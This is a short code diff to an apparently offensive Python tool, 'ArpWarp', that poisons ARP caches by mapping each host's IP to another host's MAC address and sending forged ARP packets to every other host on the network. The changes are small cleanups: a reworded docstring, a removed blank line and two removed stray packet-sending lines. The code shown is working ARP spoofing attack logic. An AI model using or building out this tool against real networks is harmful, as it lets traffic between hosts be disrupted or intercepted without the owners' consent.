@@ -58,7 +58,7 @@ class ArpWarp:
 
     def generate_poisoned_cache(self) -> Dict[str, str]:
         """
-        Make a new poisoned table where each key has the value of the preceeding key
+        Generate a new poisoned cache table where each key has the value of the previous key
         """
         poisoned_table = dict()
         table_size = len(self.original_arp_cache)
@@ -80,7 +80,6 @@ class ArpWarp:
         """
         for poison_host_ip, poison_host_mac in self.poisoned_arp_cache.items():
             print(f"[*] Poisoning for {poison_host_ip}...")
-
             for target_host_ip, target_host_mac in self.original_arp_cache.items():
                 if target_host_ip != poison_host_ip:
                     self.send_arp_packet(iface=self.network_interface,
@@ -89,8 +88,6 @@ class ArpWarp:
                                          hwsrc=poison_host_mac,
                                          pdst=target_host_ip,
                                          hwdst=target_host_mac)
-                    arp_packet = ARP()
-                    sendp(Ether() / arp_packet, iface=self.network_interface)
 
     def restore_arp(self):
         """
